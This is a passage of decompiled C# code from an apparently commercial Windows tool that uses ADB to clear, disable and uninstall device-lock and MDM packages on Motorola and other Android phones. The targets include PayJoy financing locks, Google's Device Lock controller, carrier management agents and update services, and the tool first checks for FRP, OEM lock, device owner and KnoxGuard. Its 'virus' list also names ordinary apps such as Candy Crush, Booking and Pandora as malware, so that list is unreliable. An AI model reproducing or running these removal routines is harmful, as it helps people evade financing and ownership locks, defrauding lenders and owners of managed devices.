								"com.motorola.android.launcher.overlay.retail"
							},
							{
								"M  Retail ROW",
								"com.motorola.android.launcher.overlay.retail.row"
							},
							{
								"M TELUS",
								"com.motorola.android.launcher.overlay.telus"
							},
							{
								"M USC",
								"com.motorola.launcherconfig.overlay.usc"
							},
							{
								"M cit",
								"com.motorola.motocit"
							},
							{
								"M  Overlay",
								"com.motorola.msimsettings.overlay"
							},
							{
								"Verizon",
								"com.motorola.omadm.vzw"
							},
							{
								"Device Lock",
								"com.google.android.overlay.devicelockcontroller"
							},
							{
								"M IMEI",
								"com.android.dialer.overlay.imei"
							},
							{
								"P@yJoy",
								"com.motorola.android.overlay.payjoy"
							},
							{
								"PAKS USC",
								"com.motorola.paks.overlay.usc"
							},
							{
								"P@yJoy Access",
								"com.payjoy.access"
							},
							{
								"M Config Service",
								"com.motorola.rcsConfigService"
							},
							{
								"SPD Headless",
								"com.spectrum.cm.headless"
							},
							{
								"SPD Extensions",
								"com.motorola.spectrum.setup.extensions"
							},
							{
								"MS USC",
								"com.motorola.android.systemui.overlay.usc"
							},
							{
								"T-Mobile Echolocate",
								"com.tmobile.echolocate.system"
							},
							{
								"Telecom",
								"com.motorola.android.server.telecom.overlay.jp"
							},
							{
								"Trustonic",
								"com.trustonic.teeservice"
							},
							{
								"US Cellular",
								"com.uscc.ecid"
							},
							{
								"M Up",
								"com.motorola.ccc.ota"
							},
							{
								"M FTA",
								"com.motorola.android.fota"
							},
							{
								"M System up",
								"com.android.dynsystem"
							},
							{
								"MDM Tel 1",
								"de.telekom.tsc"
							},
							{
								"MDM Tel 2",
								"com.taboola.mip"
							},
							{
								"Paks",
								"com.motorola.paks"
							},
							{
								"Paks ",
								"com.motorola.paks.notification"
							},
							{
								"Realme Ota",
								"com.oppo.ota"
							},
							{
								"Realme Carrier update",
								"com.oplus.cota"
							},
							{
								"Realme Up",
								"com.oplus.sau"
							}
						};
						this.MostrarEstadoAntesDelProceso("MDM Motorola", dictionary, selectedDevice);
						List<string> list = new List<string>();
						List<string> list2 = new List<string>();
						List<string> list3 = new List<string>();
						try
						{
							foreach (string arg in dictionary.Values)
							{
								list.Add(string.Format("shell pm clear --user 0 {0}", arg));
								list2.Add(string.Format("shell pm disable-user --user 0 {0}", arg));
								list3.Add(string.Format("shell pm uninstall --user 0 {0}", arg));
							}
						}
						finally
						{
							Dictionary<string, string>.ValueCollection.Enumerator enumerator;
							((IDisposable)enumerator).Dispose();
						}
						List<List<string>> etapas = new List<List<string>>
						{
							list,
							list2,
							list3
						};
						this.EjecutarProcesoAdb("Desinstalación MDM Motorola", etapas, selectedDevice);
						this.MostrarEstadoDespuesDelProceso("MDM Motorola", dictionary, selectedDevice);
					}
				}
				catch (Exception ex)
				{
					MessageBox.Show("Error durante el proceso: " + ex.Message);
				}
				finally
				{
					this.processRunning = false;
					this.AplicarPermisosDesdeFirebasePorPlan();
					this.btnCancelarProceso.Enabled = false;
				}
			}
		}

		// Token: 0x060000AC RID: 172 RVA: 0x000096EC File Offset: 0x000078EC
		private void btnCleanMotoApps2024_Click(object sender, EventArgs e)
		{
			bool flag = this.processRunning;
			if (flag)
			{
				MessageBox.Show("⚠ Ya hay un proceso en ejecución. Por favor, espera a que termine.");
			}
			else
			{
				this.processRunning = true;
				this.cancelRequested = false;
				this.SetAllButtonsEnabled(false, null);
				this.btnCancelarProceso.Enabled = true;
				this.VerificarEntornoSeguro();
				this.ProgressBar1.Invoke(new VB$AnonymousDelegate_0(delegate()
				{
					this.InitializeProgressBar(3);
					this.UpdateProgressBar();
				}));
				Task.Run(delegate()
				{
					try
					{
						Form1._Closure$__132-0 CS$<>8__locals1 = new Form1._Closure$__132-0(CS$<>8__locals1);
						CS$<>8__locals1.$VB$Me = this;
						CS$<>8__locals1.$VB$Local_selectedDevice = "";
						CS$<>8__locals1.$VB$Local_devices = this.GetAdbDevices();
						this.cmbDevicesAdb.Invoke(new VB$AnonymousDelegate_0(delegate()
						{
							bool flag3 = CS$<>8__locals1.$VB$Local_devices.Count > 0 && CS$<>8__locals1.$VB$Me.cmbDevicesAdb.SelectedItem != null;
							if (flag3)
							{
								CS$<>8__locals1.$VB$Local_selectedDevice = CS$<>8__locals1.$VB$Me.cmbDevicesAdb.SelectedItem.ToString();
							}
						}));
						bool flag2 = string.IsNullOrEmpty(CS$<>8__locals1.$VB$Local_selectedDevice);
						if (flag2)
						{
							MessageBox.Show("No se ha detectado ningún dispositivo ADB.");
							return;
						}
						this.UpdateProgressBar();
						Dictionary<string, string> dictionary = new Dictionary<string, string>
						{
							{
								"ATT Operador ext",
								"com.motorola.att.phone.extensions"
							},
							{
								"OBE Motorola",
								"com.aura.oobe.motorola"
							},
							{
								"M DeviceLock",
								"com.motorola.ccc.devicemanagement"
							},
							{
								"M Device Notification",
								"com.motorola.ccc.notification"
							},
							{
								"Carrier Config",
								"com.motorola.carrierconfig"
							},
							{
								"DIMO",
								"com.motorola.dimo"
							},
							{
								"Android Prov",
								"com.android.providers.downloads"
							},
							{
								"Android UI",
								"com.android.providers.downloads.ui"
							},
							{
								"Easy Pref",
								"com.motorola.easyprefix"
							},
							{
								"G Supervision",
								"com.google.android.gms.supervision"
							},
							{
								"Google Device Lock",
								"com.google.android.devicelockcontroller"
							},
							{
								"M  Retail",
								"com.motorola.android.launcher.overlay.retail"
							},
							{
								"M  Retail ROW",
								"com.motorola.android.launcher.overlay.retail.row"
							},
							{
								"M TELUS",
								"com.motorola.android.launcher.overlay.telus"
							},
							{
								"M USC",
								"com.motorola.launcherconfig.overlay.usc"
							},
							{
								"M cit",
								"com.motorola.motocit"
							},
							{
								"M  Overlay",
								"com.motorola.msimsettings.overlay"
							},
							{
								"Verizon",
								"com.motorola.omadm.vzw"
							},
							{
								"Device Lock",
								"com.google.android.overlay.devicelockcontroller"
							},
							{
								"M IMEI",
								"com.android.dialer.overlay.imei"
							},
							{
								"P@yJoy",
								"com.motorola.android.overlay.payjoy"
							},
							{
								"PAKS USC",
								"com.motorola.paks.overlay.usc"
							},
							{
								"P@yJoy Access",
								"com.payjoy.access"
							},
							{
								"M Config Service",
								"com.motorola.rcsConfigService"
							},
							{
								"SPD Headless",
								"com.spectrum.cm.headless"
							},
							{
								"SPD Extensions",
								"com.motorola.spectrum.setup.extensions"
							},
							{
								"MS USC",
								"com.motorola.android.systemui.overlay.usc"
							},
							{
								"T-Mobile Echolocate",
								"com.tmobile.echolocate.system"
							},
							{
								"Telecom",
								"com.motorola.android.server.telecom.overlay.jp"
							},
							{
								"Trustonic",
								"com.trustonic.teeservice"
							},
							{
								"US Cellular",
								"com.uscc.ecid"
							},
							{
								"M Up",
								"com.motorola.ccc.ota"
							},
							{
								"M FTA",
								"com.motorola.android.fota"
							},
							{
								"M System up",
								"com.android.dynsystem"
							},
							{
								"MDM Tel 1",
								"de.telekom.tsc"
							},
							{
								"MDM Tel 2",
								"om.taboola.mip"
							},
							{
								"Paks",
								"com.motorola.paks"
							},
							{
								"Paks ",
								"com.motorola.paks.notification"
							},
							{
								"Realme Ota",
								"com.oppo.ota"
							},
							{
								"Realme Carrier update",
								"com.oplus.cota"
							},
							{
								"Realme Up",
								"com.oplus.sau"
							}
						};
						this.MostrarEstadoAntesDelProceso("MDM Motorola", dictionary, CS$<>8__locals1.$VB$Local_selectedDevice);
						List<string> list = new List<string>();
						List<string> list2 = new List<string>();
						List<string> list3 = new List<string>();
						try
						{
							foreach (string arg in dictionary.Values)
							{
								list.Add(string.Format("shell pm clear --user 0 {0}", arg));
								list2.Add(string.Format("shell pm disable-user --user 0 {0}", arg));
								list3.Add(string.Format("shell pm uninstall --user 0 {0}", arg));
							}
						}
						finally
						{
							Dictionary<string, string>.ValueCollection.Enumerator enumerator;
							((IDisposable)enumerator).Dispose();
						}
						List<List<string>> etapas = new List<List<string>>
						{
							list,
							list2,
							list3
						};
						this.EjecutarProcesoAdb("Desinstalación MDM Motorola", etapas, CS$<>8__locals1.$VB$Local_selectedDevice);
						this.ProgressBar1.Invoke(new VB$AnonymousDelegate_0(delegate()
						{
							this.UpdateProgressBar();
						}));
						this.MostrarEstadoDespuesDelProceso("MDM Motorola", dictionary, CS$<>8__locals1.$VB$Local_selectedDevice);
					}
					catch (Exception ex)
					{
						MessageBox.Show("❌ Error durante el proceso: " + ex.Message);
					}
					this.processRunning = false;
					this.btnCancelarProceso.Enabled = false;
					this.AplicarPermisosDesdeFirebasePorPlan();
				});
				this.processRunning = false;
				this.btnCancelarProceso.Enabled = false;
				this.AplicarPermisosDesdeFirebasePorPlan();
			}
		}

		// Token: 0x060000AD RID: 173 RVA: 0x00009784 File Offset: 0x00007984
		public List<string> VerificarEstadoPaquetes(Dictionary<string, string> paquetes, string selectedDevice)
		{
			List<string> list = new List<string>();
			string text = this.ExecuteAdbCommand("shell pm list packages", selectedDevice);
			try
			{
				foreach (KeyValuePair<string, string> keyValuePair in paquetes)
				{
					string key = keyValuePair.Key;
					string value = keyValuePair.Value;
					bool flag = text.Contains(value);
					if (flag)
					{
						list.Add(string.Format("{0} ---- Active.", key.PadRight(25)));
					}
					else
					{
						list.Add(string.Format("{0} ---- Not fount.", key.PadRight(25)));
					}
				}
			}
			finally
			{
				Dictionary<string, string>.Enumerator enumerator;
				((IDisposable)enumerator).Dispose();
			}
			return list;
		}

		// Token: 0x060000AE RID: 174 RVA: 0x00009844 File Offset: 0x00007A44
		public void MostrarEstadoAntesDelProceso(string titulo, Dictionary<string, string> paquetesDict, string selectedDevice)
		{
			this.txtOutput.AppendText(Environment.NewLine + string.Format("\ud83d\udd0d Estado antes del proceso: {0}", titulo) + Environment.NewLine);
			List<string> list = this.VerificarBloqueosPosibles(selectedDevice);
			try
			{
				foreach (string str in list)
				{
					this.txtOutput.AppendText(str + Environment.NewLine);
				}
			}
			finally
			{
				List<string>.Enumerator enumerator;
				((IDisposable)enumerator).Dispose();
			}
			List<string> list2 = this.VerificarEstadoPaquetes(paquetesDict, selectedDevice);
			try
			{
				foreach (string text in list2)
				{
					bool flag = text.Contains("Active");
					if (flag)
					{
						this.txtOutput.AppendText("⚠️  - " + text + Environment.NewLine);
					}
				}
			}
			finally
			{
				List<string>.Enumerator enumerator2;
				((IDisposable)enumerator2).Dispose();
			}
			this.txtOutput.AppendText("\ud83d\udd0d⚠️ Revisa los bloqueos antes de continuar con el proceso." + Environment.NewLine);
		}

		// Token: 0x060000AF RID: 175 RVA: 0x0000996C File Offset: 0x00007B6C
		public void MostrarEstadoDespuesDelProceso(string titulo, Dictionary<string, string> paquetesDict, string selectedDevice)
		{
			this.txtOutput.AppendText(Environment.NewLine + "\ud83d\udd0d Verificando después del proceso:" + Environment.NewLine);
			List<string> list = this.VerificarEstadoPaquetes(paquetesDict, selectedDevice);
			List<string> list2 = list.Where((Form1._Closure$__.$I135-0 == null) ? (Form1._Closure$__.$I135-0 = ((string x) => x.Contains("Active."))) : Form1._Closure$__.$I135-0).ToList<string>();
			try
			{
				foreach (string str in list)
				{
					this.txtOutput.AppendText(str + Environment.NewLine);
				}
			}
			finally
			{
				List<string>.Enumerator enumerator;
				((IDisposable)enumerator).Dispose();
			}
			bool flag = list2.Count > 0;
			if (flag)
			{
				this.txtOutput.AppendText(Environment.NewLine + "⚠️ Atención: Algunos paquetes aún siguen activos:" + Environment.NewLine);
				try
				{
					foreach (string str2 in list2)
					{
						this.txtOutput.AppendText("  - " + str2 + Environment.NewLine);
					}
				}
				finally
				{
					List<string>.Enumerator enumerator2;
					((IDisposable)enumerator2).Dispose();
				}
			}
			else
			{
				this.txtOutput.AppendText(Environment.NewLine + "✅ Todos los paquetes han sido eliminados correctamente." + Environment.NewLine);
			}
		}

		// Token: 0x060000B0 RID: 176 RVA: 0x00009ADC File Offset: 0x00007CDC
		private async void btnConsultarPosiblesBloqueos_Click(object sender, EventArgs e)
		{
			bool flag = this.processRunning;
			if (flag)
			{
				MessageBox.Show("⚠ Ya hay un proceso en ejecución. Por favor, espera a que termine.");
			}
			else
			{
				this.processRunning = true;
				this.cancelRequested = false;
				this.SetAllButtonsEnabled(false, null);
				this.btnCancelarProceso.Enabled = true;
				this.VerificarEntornoSeguro();
				this.ListView1.Visible = false;
				this.txtOutput.Clear();
				this.ProgressBar1.Invoke(new VB$AnonymousDelegate_0(delegate()
				{
					this.InitializeProgressBar(2);
					this.UpdateProgressBar();
				}));
				CancellationTokenSource cts = new CancellationTokenSource();
				CancellationToken token = cts.Token;
				Task tareaProceso = Task.Run(delegate()
				{
					try
					{
						List<string> adbDevices = this.GetAdbDevices();
						bool flag2 = adbDevices.Count == 0;
						if (flag2)
						{
							this.LogOutput("❌ No se ha detectado ningún dispositivo ADB. Por favor, conecta un dispositivo.");
						}
						else
						{
							string selectedDevice = "";
							this.cmbDevicesAdb.Invoke(new VB$AnonymousDelegate_0(delegate()
							{
								bool flag5 = this.cmbDevicesAdb.SelectedItem != null;
								if (flag5)
								{
									selectedDevice = this.cmbDevicesAdb.SelectedItem.ToString();
								}
							}));
							bool flag3 = string.IsNullOrWhiteSpace(selectedDevice);
							if (flag3)
							{
								this.LogOutput("❌ Por favor selecciona un dispositivo ADB.");
							}
							else
							{
								bool flag4 = this.cancelRequested | token.IsCancellationRequested;
								if (flag4)
								{
									this.LogOutput("⏹ Proceso cancelado antes de iniciar la lectura.");
								}
								else
								{
									this.LogOutput(string.Format("\ud83d\udd0d Leyendo información de: {0}", selectedDevice));
									this.MostrarSoloBloqueosDispositivo("Consultar (Verificación de bloqueos)", selectedDevice);
									this.ProgressBar1.Invoke(new VB$AnonymousDelegate_0(delegate()
									{
										this.UpdateProgressBar();
									}));
								}
							}
						}
					}
					catch (Exception ex)
					{
						this.LogOutput(string.Format("❗ Error durante el proceso: {0}", ex.Message));
					}
					finally
					{
						this.processRunning = false;
						this.AplicarPermisosDesdeFirebasePorPlan();
						this.btnCancelarProceso.Enabled = false;
					}
				}, token);
				Task tareaTimeout = Task.Delay(30000);
				await Task.WhenAny(new Task[]
				{
					tareaProceso,
					tareaTimeout
				});
				if (!tareaProceso.IsCompleted)
				{
					this.cancelRequested = true;
					this.LogOutput("⏰ Tiempo de espera agotado. El proceso fue cancelado automáticamente.");
				}
				this.processRunning = false;
				this.btnCancelarProceso.Enabled = false;
				this.AplicarPermisosDesdeFirebasePorPlan();
			}
		}

		// Token: 0x060000B1 RID: 177 RVA: 0x00009B24 File Offset: 0x00007D24
		public void MostrarSoloBloqueosDispositivo1(string nombreProceso, string selectedDevice)
		{
			this.InitializeProgressBar(2);
			this.UpdateProgressBar();
			this.txtOutput.AppendText(Environment.NewLine + string.Format("\ud83d\udd0d Estado del dispositivo: {0}", nombreProceso) + Environment.NewLine);
			this.txtOutput.AppendText("\ud83d\udd12 Verificando posibles bloqueos antes de iniciar..." + Environment.NewLine);
			List<string> list = this.VerificarBloqueosPosibles(selectedDevice);
			try
			{
				foreach (string str in list)
				{
					this.txtOutput.AppendText(str + Environment.NewLine);
				}
			}
			finally
			{
				List<string>.Enumerator enumerator;
				((IDisposable)enumerator).Dispose();
			}
			this.txtOutput.AppendText("\ud83d\udd0d⚠️ Revisa los bloqueos antes de realizar cualquier operación." + Environment.NewLine);
			this.UpdateProgressBar();
		}

		// Token: 0x060000B2 RID: 178 RVA: 0x00009C04 File Offset: 0x00007E04
		public List<string> VerificarBloqueosPosibles(string selectedDevice)
		{
			this.InitializeProgressBar(2);
			this.UpdateProgressBar();
			List<string> list = new List<string>();
			try
			{
				list.Add("\ud83d\udd12 Verificando posibles bloqueos antes de iniciar...");
				string left = this.ExecuteAdbCommand("shell getprop ro.oem.locked", selectedDevice).Trim();
				string left2 = this.ExecuteAdbCommand("shell getprop ro.frp.pst", selectedDevice).Trim();
				string text = this.ExecuteAdbCommand("shell dpm get-device-owner", selectedDevice).Trim();
				string text2 = this.ExecuteAdbCommand("shell getprop knox.kg.state", selectedDevice).Trim();
				string left3 = this.ExecuteAdbCommand("shell getprop ro.config.knox", selectedDevice).Trim();
				string text3 = this.ExecuteAdbCommand("shell getprop ro.build.tags", selectedDevice).Trim();
				bool flag = Operators.CompareString(left, "1", false) == 0;
				if (flag)
				{
					list.Add("\ud83d\udd10 OEM Lock: Activado (bootloader bloqueado)");
				}
				bool flag2 = Operators.CompareString(left2, "", false) != 0;
				if (flag2)
				{
					list.Add("\ud83d\udd10 FRP (Factory Reset Protection): Presente");
				}
				bool flag3 = text.ToLower().Contains("package:");
				if (flag3)
				{
					list.Add("\ud83d\udee1️ Device Owner MDM activo: " + text);
				}
				bool flag4 = text2.ToLower().Contains("active");
				if (flag4)
				{
					list.Add("\ud83d\udee1️ KnoxGuard activo");
				}
				bool flag5 = Operators.CompareString(left3, "1", false) == 0;
				if (flag5)
				{
					list.Add("\ud83d\udee1️ Knox: Detectado");
				}
				bool flag6 = !text3.Contains("test-keys");
				if (flag6)
				{
					list.Add("\ud83d\udd0f Sistema certificado (no test-keys)");
				}
			}
			catch (Exception ex)
			{
				list.Add("❌ Error al verificar bloqueos: " + ex.Message);
			}
			return list;
		}

		// Token: 0x060000B3 RID: 179 RVA: 0x00009DC4 File Offset: 0x00007FC4
		public Dictionary<string, string> ObtenerDiccionarioBloqueos()
		{
			return new Dictionary<string, string>
			{
				{
					"ATT Operador ext",
					"com.motorola.att.phone.extensions"
				},
				{
					"OBE Motorola",
					"com.aura.oobe.motorola"
				},
				{
					"M DeviceLock",
					"com.motorola.ccc.devicemanagement"
				},
				{
					"M Device Notification",
					"com.motorola.ccc.notification"
				},
				{
					"Carrier Config",
					"com.motorola.carrierconfig"
				},
				{
					"DIMO",
					"com.motorola.dimo"
				},
				{
					"Android Prov",
					"com.android.providers.downloads"
				},
				{
					"Android UI",
					"com.android.providers.downloads.ui"
				},
				{
					"Easy Pref",
					"com.motorola.easyprefix"
				},
				{
					"G Supervision",
					"com.google.android.gms.supervision"
				},
				{
					"Google Device Lock",
					"com.google.android.devicelockcontroller"
				},
				{
					"M  Retail",
					"com.motorola.android.launcher.overlay.retail"
				},
				{
					"M  Retail ROW",
					"com.motorola.android.launcher.overlay.retail.row"
				},
				{
					"M TELUS",
					"com.motorola.android.launcher.overlay.telus"
				},
				{
					"M USC",
					"com.motorola.launcherconfig.overlay.usc"
				},
				{
					"M cit",
					"com.motorola.motocit"
				},
				{
					"M  Overlay",
					"com.motorola.msimsettings.overlay"
				},
				{
					"Verizon",
					"com.motorola.omadm.vzw"
				},
				{
					"Device Lock",
					"com.google.android.overlay.devicelockcontroller"
				},
				{
					"M IMEI",
					"com.android.dialer.overlay.imei"
				},
				{
					"P@yJoy",
					"com.motorola.android.overlay.payjoy"
				},
				{
					"PAKS USC",
					"com.motorola.paks.overlay.usc"
				},
				{
					"P@yJoy Access",
					"com.payjoy.access"
				},
				{
					"M Config Service",
					"com.motorola.rcsConfigService"
				},
				{
					"SPD Headless",
					"com.spectrum.cm.headless"
				},
				{
					"SPD Extensions",
					"com.motorola.spectrum.setup.extensions"
				},
				{
					"MS USC",
					"com.motorola.android.systemui.overlay.usc"
				},
				{
					"T-Mobile Echolocate",
					"com.tmobile.echolocate.system"
				},
				{
					"Telecom",
					"com.motorola.android.server.telecom.overlay.jp"
				},
				{
					"Trustonic",
					"com.trustonic.teeservice"
				},
				{
					"US Cellular",
					"com.uscc.ecid"
				},
				{
					"M Up",
					"com.motorola.ccc.ota"
				},
				{
					"M FTA",
					"com.motorola.android.fota"
				},
				{
					"M System up",
					"com.android.dynsystem"
				},
				{
					"MDM Tel 1",
					"de.telekom.tsc"
				},
				{
					"MDM Tel 2",
					"om.taboola.mip"
				},
				{
					"Paks",
					"com.motorola.paks"
				},
				{
					"Paks ",
					"com.motorola.paks.notification"
				},
				{
					"Realme Ota",
					"com.oppo.ota"
				},
				{
					"Realme Up",
					"com.oplus.sau"
				},
				{
					"Honor Up",
					"com.hihonor.ouc"
				}
			};
		}

		// Token: 0x060000B4 RID: 180 RVA: 0x0000A094 File Offset: 0x00008294
		public Dictionary<string, string> ObtenerDiccionarioBloqueosPixel()
		{
			return new Dictionary<string, string>
			{
				{
					"Carrier Setup",
					"com.android.carriersetup"
				},
				{
					"Pixel Setup",
					"com.google.android.pixel.setupwizard"
				},
				{
					"Pixel Setup Overlay",
					"com.google.android.pixel.setupwizard.overlay"
				},
				{
					"Pixel Setup Overlay 2019",
					"com.google.android.pixel.setupwizard.overlay2019"
				},
				{
					"Pixel Setup RRO",
					"com.google.android.pixel.setupwizard.autogenerated_rro_product__"
				},
				{
					"Virtualization Terminal",
					"com.android.virtualization.terminal"
				},
				{
					"Private Space",
					"com.android.privatespace"
				},
				{
					"Retail Demo Preload",
					"com.google.android.apps.retaildemo.preload"
				},
				{
					"Retail Demo",
					"com.google.android.retaildemo"
				},
				{
					"Verizon MIPS Services",
					"com.verizon.mips.services"
				},
				{
					"eUICC Pixel",
					"com.google.euiccpixel"
				},
				{
					"Dreamliner Updater",
					"com.google.android.dreamlinerupdater"
				},
				{
					"Config Updater",
					"com.google.android.configupdater"
				},
				{
					"Dynamic System",
					"com.android.dynsystem"
				},
				{
					"Factory OTA",
					"com.google.android.factoryota"
				},
				{
					"GMS Supervision",
					"com.google.android.gms.supervision"
				}
			};
		}

		// Token: 0x060000B5 RID: 181 RVA: 0x0000A1BC File Offset: 0x000083BC
		private void btnCheckVirusOffline_Click(object sender, EventArgs e)
		{
			bool flag = this.processRunning;
			if (flag)
			{
				MessageBox.Show("⚠ Ya hay un proceso en ejecución. Por favor, espera a que termine.");
			}
			else
			{
				this.processRunning = true;
				this.cancelRequested = false;
				this.SetAllButtonsEnabled(false, null);
				this.btnCancelarProceso.Enabled = true;
				this.VerificarEntornoSeguro();
				this.ListView1.Visible = false;
				this.txtOutput.Clear();
				this.ProgressBar1.Invoke(new VB$AnonymousDelegate_0(delegate()
				{
					this.InitializeProgressBar(2);
					this.UpdateProgressBar();
				}));
				Task.Run(delegate()
				{
					try
					{
						List<string> adbDevices = this.GetAdbDevices();
						bool flag2 = adbDevices.Count == 0 || this.cmbDevicesAdb.Invoke(new VB$AnonymousDelegate_1<object>(() => this.cmbDevicesAdb.SelectedItem)) == null;
						if (flag2)
						{
							MessageBox.Show("No se ha detectado ningún dispositivo ADB. Por favor, conecta un dispositivo.");
							return;
						}
						string selectedDevice = "";
						this.cmbDevicesAdb.Invoke(new VB$AnonymousDelegate_0(delegate()
						{
							selectedDevice = this.cmbDevicesAdb.SelectedItem.ToString();
						}));
						this.UpdateProgressBar();
						this.ConsultarPosiblesVirusDispositivo("Consulta (Detección de virus)", selectedDevice);
					}
					catch (Exception ex)
					{
						MessageBox.Show("Error en el proceso: " + ex.Message);
					}
					finally
					{
						this.processRunning = false;
						this.AplicarPermisosDesdeFirebasePorPlan();
						this.btnCancelarProceso.Enabled = false;
					}
					this.UpdateProgressBar();
				});
			}
		}

		// Token: 0x060000B6 RID: 182 RVA: 0x0000A250 File Offset: 0x00008450
		public void ConsultarPosiblesVirusDispositivo(string nombreProceso, string selectedDevice)
		{
			try
			{
				Dictionary<string, string> dictionary = this.ObtenerDiccionarioVirus();
				List<string> list = new List<string>();
				this.txtOutput.AppendText(Environment.NewLine + string.Format("\ud83d\udd0e Verificando posibles virus ({0})...", nombreProceso) + Environment.NewLine);
				try
				{
					foreach (KeyValuePair<string, string> keyValuePair in dictionary)
					{
						string key = keyValuePair.Key;
						string value = keyValuePair.Value;
						string text = this.ExecuteAdbCommand(string.Format("shell pm list packages {0}", value), selectedDevice);
						bool flag = text.Contains(value);
						if (flag)
						{
							list.Add(string.Format("☣️ Detectado: {0} ({1})", key, value));
						}
					}
				}
				finally
				{
					Dictionary<string, string>.Enumerator enumerator;
					((IDisposable)enumerator).Dispose();
				}
				bool flag2 = list.Count > 0;
				if (flag2)
				{
					try
					{
						foreach (string str in list)
						{
							this.txtOutput.AppendText(str + Environment.NewLine);
						}
					}
					finally
					{
						List<string>.Enumerator enumerator2;
						((IDisposable)enumerator2).Dispose();
					}
				}
				else
				{
					this.txtOutput.AppendText("✅ No se encontraron apps sospechosas del diccionario de virus." + Environment.NewLine);
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show("Error al consultar virus: " + ex.Message);
			}
			this.processRunning = false;
			this.btnCancelarProceso.Enabled = false;
			this.AplicarPermisosDesdeFirebasePorPlan();
		}

		// Token: 0x060000B7 RID: 183 RVA: 0x0000A41C File Offset: 0x0000861C
		public Dictionary<string, string> ObtenerDiccionarioVirus()
		{
			return new Dictionary<string, string>
			{
				{
					"Tijuana Seguro",
					"com.tijuana.seguro"
				},
				{
					"Daily Cleaner DC",
					"dc.daily.cleaner"
				},
				{
					"Deep Cleaner DC",
					"dcdeep.deep.cleaner"
				},
				{
					"GO Cleaner",
					"go.cleaner.junk.clean.app"
				},
				{
					"Google Contact Keys",
					"com.google.android.contactkeys"
				},
				{
					"ChromaZone PaintKit",
					"com.inkrise.chromazone.paintkit"
				},
				{
					"EZ Photo Video Recovery",
					"allrecovery.recoverdeletedphotovideo.ezrecovery"
				},
				{
					"Spider Solitaire Mobilityware",
					"com.mobilityware.spider"
				},
				{
					"SAGTJD NWDGuy",
					"com.sagtjd.nwdguy"
				},
				{
					"TikTok Live Wallpaper",
					"com.zhiliao.musically.livewallpaper"
				},
				{
					"AZ Recovery",
					"photovideorecovery.recoverdeletedfilesphotovideo.azrecovery"
				},
				{
					"Swift Files",
					"sf.swift.files"
				},
				{
					"Klondike Solitaire",
					"com.smilerlee.klondike"
				},
				{
					"Google Bard",
					"com.google.android.apps.bard"
				},
				{
					"QQQ Cleaner",
					"qc.qqq.cleaner"
				},
				{
					"BoostLoop CleanX",
					"com.boostloop.wiperight.cleanx"
				},
				{
					"Body Balance App",
					"com.body.balance"
				},
				{
					"PureFone CleanMaster",
					"com.purefone.cleanmastera"
				},
				{
					"AB InBev Bees México",
					"com.abinbev.android.tapwiser.beesMexico"
				},
				{
					"Ad Block VPN Malware",
					"com.vpn.adblocker"
				},
				{
					"Ad Services Tracker",
					"com.ads.services.tracker"
				},
				{
					"AI Security",
					"com.aisecurity"
				},
				{
					"Amazon App Manager",
					"com.amazon.appmanager"
				},
				{
					"App Booster",
					"com.app.booster.speed"
				},
				{
					"Background Push Ads",
					"com.push.ads.service"
				},
				{
					"Battery Saver",
					"com.battery.saver.cleaner"
				},
				{
					"Bixby Agent",
					"com.samsung.android.bixby.agent"
				},
				{
					"Blackout Bubble",
					"com.blackout.bubble"
				},
				{
					"Blackout Word",
					"com.blackout.word"
				},
				{
					"Booking",
					"com.booking"
				},
				{
					"Booster Cleaner",
					"com.mobile.manager.cleaner"
				},
				{
					"Brain Blow Quest",
					"brain.blow.quest"
				},
				{
					"Bubble Shooter Extreme",
					"bubble.shooter.exxtreme"
				},
				{
					"Cache Booster",
					"com.cache.cleaner.phonebooster"
				},
				{
					"Calheart Caomo",
					"com.calheart.caomo.bvc"
				},
				{
					"CamScanner",
					"com.intsig.camscanner"
				},
				{
					"Candy Crush Saga",
					"com.king.candycrushsaga"
				},
				{
					"CleanSeeker VN",
					"com.vnrfhfyt.hcndscleanseeker"
				},
				{
					"Cleaning Master",
					"com.cleaningmaster.clear"
				},
				{
					"Click Downloader",
					"com.clickttdownler.sourcemedi"
				},
				{
					"ColorOS Notes",
					"com.coloros.note"
				},
				{
					"ColorOS Relax",
					"com.coloros.relax"
				},
				{
					"Cool Weather",
					"com.coolapp.weather"
				},
				{
					"Digital Turbine News",
					"com.digitalturbine.android.apps.news"
				},
				{
					"Express Weather",
					"com.handmark.expressweather"
				},
				{
					"Fake GPS",
					"com.fakegps.location"
				},
				{
					"Fancy Weather Widget",
					"com.fancy.weather.widget"
				},
				{
					"Fast Cleaner",
					"com.fast.cleaner"
				},
				{
					"File Manager Plus Adware",
					"com.manager.filetools"
				},
				{
					"Fintech Life",
					"com.fintech.life"
				},
				{
					"Flashlight Plus",
					"com.flashlight.toolplus"
				},
				{
					"Flipboard Boxer",
					"flipboard.boxer.app"
				},
				{
					"Flow Free",
					"com.bigduckgames.flow"
				},
				{
					"HapiCorp IMHapi",
					"com.hapicorp.imhapi"
				},
				{
					"Hi Security",
					"com.ehawk.antivirus.clean"
				},
				{
					"HRDF eTrqww",
					"com.hrsdf.etrqww"
				},
				{
					"Hyper Cleaner HC",
					"hc.hyper.cleaner"
				},
				{
					"Ily Puzzle Block",
					"com.ilypuzzle.block"
				},
				{
					"Instagram Lite",
					"com.instagram.lite"
				},
				{
					"Krode Translate",
					"com.krode.translate"
				},
				{
					"Master File Manager",
					"com.masterfile.manager"
				},
				{
					"Mizmo Wireless VVM",
					"com.mizmowireless.vvm"
				},
				{
					"Mobile Commander",
					"com.manager.mobilecommander"
				},
				{
					"NoteCam",
					"com.derekr.NoteCam"
				},
				{
					"OMC Agent",
					"com.samsung.android.app.omcagent"
				},
				{
					"OnePlus Brick Mode",
					"com.oneplus.brickmode"
				},
				{
					"OPPO BackupRestore",
					"com.coloros.backuprestore"
				},
				{
					"OPPO Lock Screen",
					"com.coloros.onekeylockscreen"
				},
				{
					"Oplus Member",
					"com.oplus.member"
				},
				{
					"Pandora",
					"com.pandora.android"
				},
				{
					"Pepsi Joy",
					"com.pepsicolatam.joy"
				},
				{
					"Phone Optimizer",
					"com.boost.phoneoptimizer"
				},
				{
					"Photo Gallery (Octool)",
					"com.octool.photogallery"
				},
				{
					"QuickPic (infected fork)",
					"com.alensw.PicFolder"
				},
				{
					"Rainy Day Reminder",
					"com.drinkdepoly.watermoi.app"
				},
				{
					"SayHi Nearby",
					"com.unearby.sayhi"
				},
				{
					"Screen Lock Ads",
					"com.locker.screenad"
				},
				{
					"Security Master",
					"com.cleanmaster.security"
				},
				{
					"Smart Suggestions",
					"com.samsung.android.smartsuggestions"
				},
				{
					"Smart Tracker Yummo",
